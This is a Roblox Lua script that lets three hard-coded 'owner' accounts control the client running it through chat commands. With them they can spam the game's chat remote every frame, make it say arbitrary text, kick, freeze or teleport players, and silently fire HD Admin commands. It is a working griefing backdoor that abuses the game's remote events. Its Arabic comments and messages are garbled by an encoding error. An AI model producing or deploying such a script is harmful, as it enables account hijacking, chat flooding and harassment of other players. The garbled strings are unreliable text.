--// Ø®Ø¯Ù…Ø§Øª
local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local RunService = game:GetService("RunService")
local LocalPlayer = Players.LocalPlayer

--// Ø§Ù„Ø£ÙˆÙ†Ø±Ø§Øª (Ø§Ù„Ù„ÙŠ ÙŠØªØ­ÙƒÙ…ÙˆÙ†)
local Owners = {
    ["1il5i"] = true,
    ["1il5f"] = true,
    ["eyad51533"] = true
}

--// Ø§Ù„Ø±ÙŠÙ…Ù†ØªØ§Øª Ø§Ù„Ù…Ø³ØªØ®Ø¯Ù…Ø©
local SendMessage = ReplicatedStorage:WaitForChild("Events"):WaitForChild("SendMessage")
local HDAdminRequest = ReplicatedStorage:WaitForChild("HDAdminHDClient"):WaitForChild("Signals"):WaitForChild("RequestCommandSilent")

--// Ù…ØªØºÙŠØ±Ø§Øª Ø§Ù„Ø³Ø¨Ø§Ù… ÙˆØ§Ù„ØªØ¬Ù…ÙŠØ¯
local SpamTasks = {}
local FrozenPlayers = {}

--// Ø¯Ø§Ù„Ø© ØªÙ†ÙÙŠØ° Ø§Ù„Ø£Ù…Ø± Ø¹Ù„Ù‰ Ù„Ø§Ø¹Ø¨ Ù…Ø¹ÙŠÙ† Ø£Ùˆ Ø§Ù„ÙƒÙ„
local function ExecuteOn(targetName, func)
    if targetName == "all" then
        for _, plr in ipairs(Players:GetPlayers()) do
            if not Owners[plr.Name] then
                func(plr)
            end
        end
    else
        local target = Players:FindFirstChild(targetName) or Players:FindFirstChildWhichIsA("Player", function(p) return string.find(string.lower(p.DisplayName), "^"..string.lower(targetName)) end)
        if target and not Owners[target.Name] then
            func(target)
        end
    end
end

--// Ù…Ø±Ø§Ù‚Ø¨Ø© Ø§Ù„Ø´Ø§Øª Ù„Ù„Ø£ÙˆÙ†Ø±Ø§Øª ÙÙ‚Ø·
local function MonitorOwnerChat(player)
    if not Owners[player.Name] then return end

    player.Chatted:Connect(function(msg)
        msg = string.lower(msg)
        local args = string.split(msg, " ")

        -- .3mk all/user
        if args[1] == ".3mk" and args[2] then
            ExecuteOn(args[2], function(target)
                SendMessage:FireServer("Ø¹Ù‹Ù…Ù‹Ù‰Ø§Ù†Ù‹ÙŠ Ø§ÙˆÙ‹Ù†Ù‹Ù‰Ø±Ù‹Ø§ØªÙ‹ Ø³ÙÙƒÙ‹Ù‰Ù‹Ø±Ù‹Ø¨ØªÙ‹ Ø²Ù‹Ø­Ù‹Ù‰ÙÙÙ‹ ğŸ¥º")
            end)

        -- .f7lk all/user
        elseif args[1] == ".f7lk" and args[2] then
            ExecuteOn(args[2], function(target)
                SendMessage:FireServer("ÙØ­Ù‰Ù‹Ù„Ù‹ÙŠ ("..player.DisplayName..") Ø§Ù‹Ù‡ÙÙ‡Ù ğŸ¥º")
            end)

        -- .kick user/all (Ø§Ù„Ø³Ø¨Ø¨)
        elseif args[1] == ".kick" and args[2] then
            local reason = table.concat(args, " ", 3) or "ØªÙ… Ø·Ø±Ø¯Ùƒ Ù…Ù† Ø§Ù„Ø§ÙˆÙ†Ø±Ø§Øª"
            ExecuteOn(args[2], function(target)
                target:Kick(reason)
            end)

        -- .spam user/all (Ø§Ù„ÙƒÙ„Ø§Ù…)
        elseif args[1] == ".spam" and args[2] and args[3] then
            local text = table.concat(args, " ", 3)
            ExecuteOn(args[2], function(target)
                if SpamTasks[target.UserId] then SpamTasks[target.UserId]:Disconnect() end
                SpamTasks[target.UserId] = RunService.Heartbeat:Connect(function()
                    SendMessage:FireServer(text)
                end)
            end)

        -- .unspam user/all
        elseif args[1] == ".unspam" and args[2] then
            ExecuteOn(args[2], function(target)
                if SpamTasks[target.UserId] then
                    SpamTasks[target.UserId]:Disconnect()
                    SpamTasks[target.UserId] = nil
                end
            end)

        -- .say user/all (Ø§Ù„ÙƒÙ„Ø§Ù…)
        elseif args[1] == ".say" and args[2] and args[3] then
            local text = table.concat(args, " ", 3)
            ExecuteOn(args[2], function(target)
                SendMessage:FireServer(text)
            end)

        -- .freeze user/all
        elseif args[1] == ".freeze" and args[2] then
            ExecuteOn(args[2], function(target)
                local char = target.Character or target.CharacterAdded:Wait()
                local hrp = char:FindFirstChild("HumanoidRootPart")
                if hrp then
                    FrozenPlayers[target.UserId] = true
                    hrp.Anchored = true
                    target.CharacterAdded:Connect(function(newChar)
                        task.wait(0.5)
                        local newHrp = newChar:FindFirstChild("HumanoidRootPart")
                        if newHrp and FrozenPlayers[target.UserId] then
                            newHrp.Anchored = true
                        end
                    end)
                end
            end)

        -- .unfreeze user/all
        elseif args[1] == ".unfreeze" and args[2] then
            ExecuteOn(args[2], function(target)
                FrozenPlayers[target.UserId] = nil
                local char = target.Character
                if char then
                    local hrp = char:FindFirstChild("HumanoidRootPart")
                    if hrp then hrp.Anchored = false end
                end
            end)

        -- .bring all/user
        elseif args[1] == ".bring" and args[2] then
            local ownerChar = player.Character or player.CharacterAdded:Wait()
            local ownerHrp = ownerChar:WaitForChild("HumanoidRootPart")
            ExecuteOn(args[2], function(target)
                local char = target.Character or target.CharacterAdded:Wait()
                local hrp = char:WaitForChild("HumanoidRootPart")
                hrp.CFrame = ownerHrp.CFrame * CFrame.new(0,0,-3)
            end)

        -- .cmd all/user
        elseif args[1] == ".cmd" and args[2] then
            ExecuteOn(args[2], function(target)
                local cmd = ".neon me .paint me pk .size me 3 .height me 0.1 .aura me .titlepk me Ø§Ø®Ø¨Ù€Ø§Ø± Ø³Ù€ÙŠÙ€Ø±ÙÙ€Ø±ÙƒÙ€Ù… Ø§Ù„Ù€Ø­Ù€Ù„Ù€Ùˆ"
                HDAdminRequest:InvokeServer(cmd)
            end)
        end
    end)
end

-- Ø¨Ø¯Ø¡ Ø§Ù„Ù…Ø±Ø§Ù‚Ø¨Ø©
for _, plr in ipairs(Players:GetPlayers()) do
    if Owners[plr.Name] then
        MonitorOwnerChat(plr)
    end
end

Players.PlayerAdded:Connect(function(plr)
    if Owners[plr.Name] then
        MonitorOwnerChat(plr)
    end
end)
